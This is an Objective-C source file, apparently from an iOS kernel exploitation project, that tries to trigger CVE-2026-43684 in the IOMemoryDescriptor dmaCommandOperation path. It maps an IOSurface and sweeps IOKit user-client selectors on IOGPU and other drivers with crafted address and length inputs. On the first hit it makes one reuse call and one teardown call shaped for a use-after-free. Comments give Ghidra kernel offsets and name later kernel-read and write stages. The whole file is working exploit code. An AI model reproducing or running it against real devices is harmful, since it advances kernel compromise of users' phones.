//
//  P101DmaCommandFire.m
//  CVE-2026-43684 dmaCommandOperation — bounded REUSE fire.
//
//  Ghidra 23F77 cve43684_IOMD_dmaCommandOperation 0xfffffff00a507dbc:
//    IOMD+0x68 is the counter (pre-26.x name +0x34). First call iVar2==0
//    sets dmaCommand+0x60 addr / +0x68 len. Second call with SAME addr+len
//    while IOMD+0x68 != 0 returns SUCCESS and only increments.
//    param_4!=0 && (IOMD+0x64 & 0xf)==2 is the teardown callback (UAF shape).
//  P069 only did makeMapping (increment at +0x68 via map, not this fn).
//  P086 IOGPU sel 0..40 x zero-args = 0 fingerprint hits.
//
//  This TAP: CacheMode PurpleGfxMem MD + real addr/len, then ONE setup and
//  ONE reuse on the first fingerprint or SUCCESS. No unbounded loop.
//  One teardown-shaped call (param_4=1). Does not set hasKread.
//  Isolate: reboot after T7 phys-map-3. Do not stack on T4/T7.
//

#import "P101DmaCommandFire.h"
#import "LabDeviceProfile.h"
#import "LabRuntimeOffsets.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <IOKit/IOKitLib.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P101_BUILD @"p101-43684-reuse-v2"
#define P101_TAG   @"p101"
#define P101_LEN   0x4000ull

#define P101_KR_REUSE  0xe00002d8u
#define P101_KR_ALIGN  0xe00002d0u
#define P101_KR_LEN    0xe00002dbu

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                          mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                 mach_vm_size_t size);
kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
                                        memory_object_size_t *size,
                                        memory_object_offset_t offset,
                                        vm_prot_t permission,
                                        mem_entry_name_port_t *object_handle,
                                        mem_entry_name_port_t parent_handle);

typedef void *(*p101_isc_t)(CFDictionaryRef);
typedef void *(*p101_isbase_t)(void *);
typedef size_t (*p101_issz_t)(void *);
typedef mach_port_t (*p101_isport_t)(void *);
typedef void *(*p101_dev_create_t)(io_service_t);
typedef uint32_t (*p101_get_conn_t)(void *);
typedef void (*p101_dev_release_t)(void *);

static int p101_is_fp(kern_return_t kr) {
    return kr == (kern_return_t)P101_KR_REUSE ||
           kr == (kern_return_t)P101_KR_ALIGN ||
           kr == (kern_return_t)P101_KR_LEN;
}

@implementation P101DmaCommandFire

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    int fd = open([[docs stringByAppendingPathComponent:@"p101_dma_command_fire_log.txt"] UTF8String],
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [log appendString:out];
        if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
    };

    L([NSString stringWithFormat:@"=== p101 session %@ BUILD %@ ===",
       LabLocalMilitaryNow() ?: @"?", P101_BUILD]);
    L(@"CVE-2026-43684 dmaCommandOperation REUSE fire. Isolate from T7. One setup + one reuse.");
    L(@"Ghidra 23F77: counter is IOMD+0x68 (pre-26 name +0x34). dmaCommand at IOMD+0x70.");
    L(@"Callers FUN_fffffff0098d2e7c / 0099bed38 / 0099bf64c (vtable). P086 had 0 FP hits.");
    L(@"No hop-1. No Titan ROP. No unbounded increment loop. hasKread unchanged.");
    L([LabDeviceProfile identBlock] ?: @"ident=?");

    const LabOffTab *off = LabOff();
    if (off && off->tag && strcmp(off->tag, "A14_23F77") == 0) {
        L(@"[MAP] A14 unslid dmaCommandOperation 0xfffffff00a507dbc makeMapping 0xfffffff00a512314");
    } else {
        L([NSString stringWithFormat:@"[*] table=%s — T8101 dmaCommand VA not pasted.",
           off && off->tag ? off->tag : "NULL"]);
    }

    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p101_isc_t pCreate = ios ? (p101_isc_t)dlsym(ios, "IOSurfaceCreate") : NULL;
    p101_isbase_t pBase = ios ? (p101_isbase_t)dlsym(ios, "IOSurfaceGetBaseAddress") : NULL;
    p101_issz_t pSz = ios ? (p101_issz_t)dlsym(ios, "IOSurfaceGetAllocSize") : NULL;
    p101_isport_t pPort = ios ? (p101_isport_t)dlsym(ios, "IOSurfaceCreateMachPort") : NULL;
    if (!pCreate) {
        L(@"[-] IOSurfaceCreate absent");
        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
        return log;
    }

    int64_t sz = (int64_t)P101_LEN;
    int64_t mode = 0x100;
    CFNumberRef nSz = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sz);
    CFNumberRef nMode = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &mode);
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), nSz);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
    CFDictionarySetValue(dict, CFSTR("IOSurfaceCacheMode"), nMode);
    void *surf = pCreate(dict);
    L([NSString stringWithFormat:@"[*] CacheMode 0x100 PurpleGfxMem create -> %p", surf]);
    if (!surf) {
        CFDictionaryRemoveValue(dict, CFSTR("IOSurfaceCacheMode"));
        surf = pCreate(dict);
        L([NSString stringWithFormat:@"[*] retry without CacheMode -> %p", surf]);
    }
    void *base = (surf && pBase) ? pBase(surf) : NULL;
    size_t asz = (surf && pSz) ? pSz(surf) : 0;
    L([NSString stringWithFormat:@"[*] base=%p size=0x%zx", base, asz]);
    if (base && asz >= 8) memset(base, 0x11, asz > P101_LEN ? (size_t)P101_LEN : asz);

    mach_port_t mdport = MACH_PORT_NULL;
    mach_vm_address_t mapped = 0;
    /* v2 (2026-10-19): P069/P101 both fed mach_vm_map the IOSurface UC port
       and got kr=0x1d=KERN_INVALID_OBJECT — a UC send right is NOT a memory
       object. p019v2 and p084 proved on this device that
       mach_make_memory_entry_64 over the surface base IS (kr=0x0, port that
       mach_vm_map accepts). Same pattern as P084 lines ~150. */
    if (surf && base) {
        memory_object_size_t esz = asz ? (memory_object_size_t)asz : (memory_object_size_t)P101_LEN;
        mem_entry_name_port_t entry = 0;
        kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &esz,
            (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
        L([NSString stringWithFormat:@"[*] memory entry kr=0x%x size=0x%llx port=0x%x",
           (unsigned)ekr, (unsigned long long)esz, (unsigned)entry]);
        if (ekr == KERN_SUCCESS && entry) {
            mdport = entry;
            mach_vm_size_t msz = asz ? (mach_vm_size_t)asz : (mach_vm_size_t)P101_LEN;
            kern_return_t mkr = mach_vm_map(mach_task_self(), &mapped, msz, 0, 1,
                                            mdport, 0, false, VM_PROT_READ | VM_PROT_WRITE,
                                            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
            L([NSString stringWithFormat:@"[*] mach_vm_map kr=0x%x addr=0x%llx",
               (unsigned)mkr, (unsigned long long)mapped]);
            if (mkr != KERN_SUCCESS) mapped = 0;
        }
    }

    uint64_t va = (uint64_t)(uintptr_t)base;
    uint64_t len = asz ? (uint64_t)asz : P101_LEN;
    __block unsigned fp = 0, setups = 0, reuses = 0, teardowns = 0, fired = 0;

    void (^try_shape)(io_connect_t, const char *, uint32_t, uint64_t, uint64_t, uint32_t) =
    ^(io_connect_t conn, const char *who, uint32_t sel, uint64_t addr, uint64_t n, uint32_t p4) {
        if (fired) return;
        uint8_t in[32];
        memset(in, 0, sizeof(in));
        memcpy(in, &addr, 8);
        memcpy(in + 8, &n, 8);
        uint32_t p5 = 0;
        memcpy(in + 16, &p4, 4);
        memcpy(in + 20, &p5, 4);
        uint8_t outb[64];
        size_t outsz = sizeof(outb);
        uint64_t scOut[4] = {0};
        uint32_t scOutCnt = 4;
        kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
                                               scOut, &scOutCnt, outb, &outsz);
        int hit = p101_is_fp(kr) || kr == KERN_SUCCESS;
        if (hit || (kr != 0xe00002c2 && kr != 0xe00002c1 && kr != 0xe00002c7 &&
                    kr != 0xe00002e2 && kr != 0xe00002be && kr != 0xe00002bc)) {
            L([NSString stringWithFormat:@"    %s sel=%u addr=0x%llx len=0x%llx p4=%u kr=0x%x%s",
               who, sel, (unsigned long long)addr, (unsigned long long)n, p4, kr,
               p101_is_fp(kr) ? " FP" : (kr == KERN_SUCCESS ? " OK" : "")]);
        }
        if (p101_is_fp(kr)) fp++;
        if (kr == KERN_SUCCESS) setups++;
        if (hit && p4 == 0 && !fired) {
            /* ONE reuse: same addr+len, counter IOMD+0x68. */
            outsz = sizeof(outb);
            scOutCnt = 4;
            kern_return_t kr2 = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
                                                    scOut, &scOutCnt, outb, &outsz);
            L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (IOMD+0x68 increment path)",
               who, sel, kr2]);
            reuses++;
            if (kr2 == KERN_SUCCESS || p101_is_fp(kr2)) fired = 1;
            uint32_t p4t = 1;
            memcpy(in + 16, &p4t, 4);
            outsz = sizeof(outb);
            scOutCnt = 4;
            kern_return_t kr3 = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
                                                    scOut, &scOutCnt, outb, &outsz);
            L([NSString stringWithFormat:@"    TEARDOWN-SHAPED p4=1 %s sel=%u kr=0x%x (callback if IOMD+0x64&0xf==2)",
               who, sel, kr3]);
            teardowns++;
            fired = 1;
        }
    };

    void (^sweep_conn)(io_connect_t, const char *) = ^(io_connect_t conn, const char *who) {
        if (!conn || fired) return;
        L([NSString stringWithFormat:@"[FIRE] %s conn=%u sel 0..24 offset0 then va", who, conn]);
        for (uint32_t sel = 0; sel <= 24 && !fired; sel++) {
            try_shape(conn, who, sel, 0, len, 0);
            if (fired) break;
            if (va) try_shape(conn, who, sel, va, len, 0);
        }
    };

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    p101_dev_create_t pDevCreate = iogpu ? (p101_dev_create_t)dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
    p101_get_conn_t pGetConn = iogpu ? (p101_get_conn_t)dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
    p101_dev_release_t pDevRelease = iogpu ? (p101_dev_release_t)dlsym(iogpu, "IOGPUDeviceRelease") : NULL;

    io_service_t gpu = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
    void *dev = NULL;
    if (gpu && pDevCreate) {
        dev = pDevCreate(gpu);
        io_connect_t gc = (dev && pGetConn) ? (io_connect_t)pGetConn(dev) : 0;
        L([NSString stringWithFormat:@"[*] IOGPUDeviceCreate %p conn=%u", dev, gc]);
        sweep_conn(gc, "IOGPU/DeviceCreate");
    }
    if (gpu) IOObjectRelease(gpu);
    if (dev && pDevRelease) pDevRelease(dev);

    const char *svcs[] = {
        "IOSurfaceRoot", "IOMobileFramebuffer",
        "AppleAVE2Driver", "AppleM2ScalerCSCDriver", "AppleT8020DART", "H11ANEIn", NULL
    };
    for (int i = 0; svcs[i] && !fired; i++) {
        io_iterator_t it = 0;
        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
                                                        IOServiceMatching(svcs[i]), &it);
        if (kr != KERN_SUCCESS || !it) {
            L([NSString stringWithFormat:@"[*] %s: no match", svcs[i]]);
            continue;
        }
        io_service_t svc;
        unsigned n = 0;
        while ((svc = IOIteratorNext(it)) && n < 2 && !fired) {
            for (uint32_t ty = 0; ty < 2 && !fired; ty++) {
                io_connect_t c = 0;
                kern_return_t okr = IOServiceOpen(svc, mach_task_self(), ty, &c);
                if (okr != KERN_SUCCESS) {
                    if (okr != 0xe00002c2 && okr != 0xe00002e2 && okr != 0xe00002c1)
                        L([NSString stringWithFormat:@"    %s open type=%u kr=0x%x", svcs[i], ty, okr]);
                    continue;
                }
                char who[80];
                snprintf(who, sizeof(who), "%s/t%u", svcs[i], ty);
                sweep_conn(c, who);
                IOServiceClose(c);
            }
            IOObjectRelease(svc);
            n++;
        }
        IOObjectRelease(it);
    }

    if (mapped) mach_vm_deallocate(mach_task_self(), mapped, asz ? asz : P101_LEN);
    if (mdport) mach_port_deallocate(mach_task_self(), mdport);
    if (surf) CFRelease(surf);
    CFRelease(dict);
    CFRelease(nSz);
    CFRelease(nMode);

    L(@"=== VERDICT ===");
    L([NSString stringWithFormat:@"[*] fp=%u setups=%u reuses=%u teardowns=%u fired=%u",
       fp, setups, reuses, teardowns, fired]);
    if (fired)
        L(@"[+] P101 FIRED — reuse/teardown-shaped call reached a UC selector. Counter path IOMD+0x68. Not kread.");
    else if (fp)
        L(@"[*] P101 FP only — dmaCommand family kr without SUCCESS reuse. UC selector still unnamed.");
    else
        L(@"[-] P101 NONE — no fingerprint/SUCCESS. P086 shape holds: dmaCommandOperation UC walk-up still open.");
    L([NSString stringWithFormat:@"[*] hasKread=%@ unchanged. Titan write is P102. T7 stays reach-only.",
       [P007Board shared].hasKread ? @"YES" : @"NO"]);

    [[P007Board shared] recordEvent:@"p101_dma_fire"
                                 kind:@"fire"
                               detail:[NSString stringWithFormat:@"fired=%u fp=%u reuse=%u", fired, fp, reuses]
                               source:P101_TAG];
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return log;
}

@end
